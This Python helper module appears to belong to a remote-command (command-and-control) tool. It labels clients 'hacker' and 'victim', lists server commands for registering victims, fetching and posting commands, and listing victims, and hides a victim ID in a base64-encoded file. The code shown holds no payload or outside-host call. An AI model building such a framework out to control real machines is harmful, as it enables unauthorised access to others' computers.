import base64
import binascii
import json
import uuid
from datetime import datetime
from http import HTTPStatus
from pathlib import Path
from sys import exit
from typing import Any, Optional


class ClientType:
    """Used to distinguish between the 3 client types. Use each field to represent the corresponding client type."""

    # We didn't use Enum, because Enums are not JSON serializable.
    # Plain numbers are fine since we don't care about the values
    hacker = 1
    victim = 2


class ServerCommands:
    """Used to define the string representation of the server commands. just for avoiding the use of literals."""

    register = "register"
    fetch_cmd = "fetch_cmd"
    post_res = "post_res"
    post_cmd = "post_cmd"
    fetch_res = "fetch_res"
    create_session = "create_session"
    get_session = "get_session"
    list_victims = "list_victims"
    exit_session = "exit_session"
    delete_hacker = "delete_hacker"


class HandlerResponse:
    """A type representing the return value of the handler functions."""

    def __init__(
        self,
        successful: bool,
        res_code: HTTPStatus,
        body: Optional[bytes] = None,
        headers: dict[str, str] = {},
    ):
        self.successful = successful
        self.res_code = res_code
        self.body = body
        self.headers = headers


def validate_ip_address(ip: str):
    """Validates the ip and returns `True` if valid and `False` if otherwise"""
    ip_split = ip.split(".")

    if len(ip_split) != 4:
        return False

    # Let's try to convert each section to an int
    # and check if it is less than 255
    try:
        for section in ip_split:
            if not 0 <= int(section) < 256:
                return False
    except ValueError:
        return False

    return True


def validate_port(port: int):
    """Validates the port and returns `True` if valid and `False` if otherwise"""
    if 0 < port < 65_536:
        return True
    return False


def log(focus_message: str, description):
    print(f"[{focus_message.upper()}] {description}")


def get_formatted_time():
    """Returns the current time using YYYY-MM-DD-HH-MM-SS"""
    current_time = str(datetime.now())
    current_time = current_time.replace(":", "-").replace(" ", "-")
    current_time = current_time.split(".")[0]
    return current_time


def write_blank_json(file_path: Path, bytes=False, encoding="utf-8"):
    """Write a blank json text i.e `{}` into a json file"""
    if bytes:
        file_path.write_bytes("{}".encode(encoding))
    else:
        file_path.write_text("{}", encoding=encoding)


def write_json(file_path: Path, data: dict[Any, Any], bytes=False, encoding="utf-8"):
    """Write a stringified python dictionary to the file_path"""
    if not bytes:
        json.dump(data, file_path.open("w"), indent=2)
    else:
        file_path.write_bytes(json.dumps(data).encode(encoding))


def read_json(file_path: Path, bytes=False, encoding="utf-8"):
    """Read from the `file_path` and return a python dictionary."""
    if not bytes:
        if not file_path.is_file():
            write_blank_json(file_path)
        return json.loads(file_path.read_text())
    else:
        if not file_path.is_file():
            write_blank_json(file_path, bytes=True, encoding=encoding)
        return json.loads(file_path.read_bytes().decode(encoding))


def encode_token(token: str):
    """Encode a string to base64 then decode it to string."""
    random_encoded_bytes = token.encode("ascii")
    base64_encoded_bytes = base64.b64encode(random_encoded_bytes)
    return base64_encoded_bytes.decode("ascii")


def decode_token(token: str | bytes) -> str:
    """Decode a base64 encoded byte that has been decoded to a string or
    an original base64."""
    if isinstance(token, str):
        token = token.encode("ascii")
    b64_decoded_bytes = base64.b64decode(token)
    return b64_decoded_bytes.decode("ascii")


def generate_token():
    """Generate a new token"""
    random_uuid = uuid.uuid4()
    return str(random_uuid).replace("-", "")


def error_exit(msg: str, code: int):
    log("error", msg)
    exit(code)


def get_id(file_path: Path):
    """Get an ID for the client(either victim or hacker) and generate a new one
    if the client's data file gets lost."""
    # get the ID of the client from our super secret file

    # We can't use the read_json since we need
    # decode the string before json loading it
    if not file_path.is_file():
        write_blank_json(file_path, bytes=True, encoding="ascii")

    encoded_data = file_path.read_bytes()

    try:
        data = json.loads(decode_token(encoded_data))
    except (json.JSONDecodeError, KeyError, binascii.Error):
        write_blank_json(file_path, bytes=True, encoding="ascii")
        data = {}

    if "client_id" not in data:
        data["client_id"] = generate_token()

    client_id = data["client_id"]
    # We also cant use the write_json since we need
    # to encode with b64 before writing
    data = encode_token(json.dumps(data))
    file_path.write_bytes(data.encode("ascii"))

    return client_id


def create_base_dir(base_dir: Path, force: bool, err_code: int):
    if not force and base_dir.resolve().is_dir():
        error_exit(
            f"Can't overwrite '{base_dir}' found in the current directory, use --force to overwrite the directory",
            err_code,
        )
    else:
        base_dir.mkdir(exist_ok=True, parents=True)
